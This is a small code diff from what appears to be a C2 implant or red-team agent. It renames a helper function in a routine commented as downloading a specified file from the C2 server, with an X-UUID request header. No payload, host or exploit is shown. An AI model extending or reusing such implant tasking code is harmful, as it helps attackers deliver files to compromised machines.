@@ -7,7 +7,7 @@ namespace Task
         std::wstring wHeaders = L"X-UUID: " + pState->wUUID + L"\r\n";
 
         // Download a specified file from the C2 server.
-        BOOL bResult = System::Http::DownloadFile(
+        BOOL bResult = System::Http::FileDownload(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
